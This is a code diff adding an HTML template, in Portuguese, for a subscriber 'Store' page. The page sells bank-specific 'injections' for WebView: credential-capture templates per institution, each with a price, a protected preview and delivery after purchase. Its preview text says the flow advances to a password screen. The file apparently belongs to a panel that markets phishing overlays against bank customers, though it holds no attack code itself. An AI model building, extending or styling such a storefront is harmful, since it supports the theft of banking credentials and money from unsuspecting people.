@@ -1,0 +1,91 @@
+{% extends "subscriber/base.html" %}
+{% block title %}Store{% endblock %}
+{% block body %}
+<div class="portal layout" x-data="subscriberStore()" x-init="load()">
+    {% include "subscriber/_nav.html" %}
+    <div class="main">
+        <header class="page-head">
+            <h1>Store</h1>
+            <p>Injections HTML prontas para WebView — preview protegido, entrega após compra</p>
+        </header>
+
+        <section class="section">
+            <div class="section-head">
+                <h2>Catálogo</h2>
+                <p>Templates de captura por instituição</p>
+            </div>
+            <div class="store-grid">
+                <template x-for="product in products" :key="product.id">
+                    <article class="store-card">
+                        <div class="store-card__preview">
+                            <div class="store-card__viewport">
+                                <iframe
+                                    class="store-card__iframe"
+                                    :src="previewUrl(product.id, true)"
+                                    title=""
+                                    tabindex="-1"
+                                    loading="eager"
+                                    sandbox="allow-scripts allow-same-origin">
+                                </iframe>
+                            </div>
+                            <div class="store-card__preview-mask" aria-hidden="true"></div>
+                        </div>
+                        <div class="store-card__body">
+                            <div class="store-card__meta">
+                                <span class="store-card__bank" x-text="product.bank"></span>
+                                <span class="store-card__price" x-text="product.price_display"></span>
+                            </div>
+                            <h3 class="store-card__title" x-text="product.name"></h3>
+                            <p class="store-card__desc" x-text="product.description"></p>
+                            <div class="store-card__actions">
+                                <button type="button" class="btn btn-ghost" @click="openPreview(product)">
+                                    <svg class="btn-icon" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+                                        <path d="M1 8s2.8-5 7-5 7 5 7 5-2.8 5-7 5-7-5-7-5Z" stroke="currentColor" stroke-width="1.35" stroke-linejoin="round"/>
+                                        <circle cx="8" cy="8" r="2" stroke="currentColor" stroke-width="1.35"/>
+                                    </svg>
+                                    <span>Preview</span>
+                                </button>
+                                <button type="button" class="btn btn-action store-card__buy" @click="buy(product)">
+                                    <svg class="btn-icon" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+                                        <path d="M1.5 1.5h1.8l1.1 5.7h7.8l1.6-4.2H4.2" stroke="currentColor" stroke-width="1.25" stroke-linecap="round" stroke-linejoin="round"/>
+                                        <circle cx="5.8" cy="12.8" r="1" stroke="currentColor" stroke-width="1.25"/>
+                                        <circle cx="11.8" cy="12.8" r="1" stroke="currentColor" stroke-width="1.25"/>
+                                    </svg>
+                                    <span>Comprar</span>
+                                </button>
+                            </div>
+                        </div>
+                    </article>
+                </template>
+            </div>
+            <p class="store-empty" x-show="products.length === 0">Nenhum produto disponível no catálogo.</p>
+        </section>
+    </div>
+
+    <div class="store-modal" x-show="previewOpen" x-cloak @keydown.escape.window="closePreview()">
+        <div class="store-modal__backdrop" @click="closePreview()"></div>
+        <div class="store-modal__dialog" role="dialog" aria-modal="true" :aria-label="previewProduct?.name">
+            <header class="store-modal__head">
+                <div>
+                    <p class="store-modal__tag">PREVIEW / DEMO</p>
+                    <h2 class="store-modal__title" x-text="previewProduct?.name"></h2>
+                </div>
+                <button type="button" class="store-modal__close" @click="closePreview()" aria-label="Fechar">×</button>
+            </header>
+            <div class="store-modal__device">
+                <div class="store-modal__viewport">
+                    <iframe
+                        class="store-modal__iframe"
+                        x-bind:src="previewOpen && previewProduct ? previewUrl(previewProduct.id, false) : 'about:blank'"
+                        title="Preview do produto"
+                        sandbox="allow-scripts allow-same-origin">
+                    </iframe>
+                </div>
+            </div>
+            <p class="store-modal__hint">Interaja como no dispositivo real. Ao tocar em <strong>Continuar</strong>, o fluxo avança para a tela de senha.</p>
+        </div>
+    </div>
+
+    <p class="store-toast" x-show="toast" x-text="toast" x-cloak></p>
+</div>
+{% endblock %}
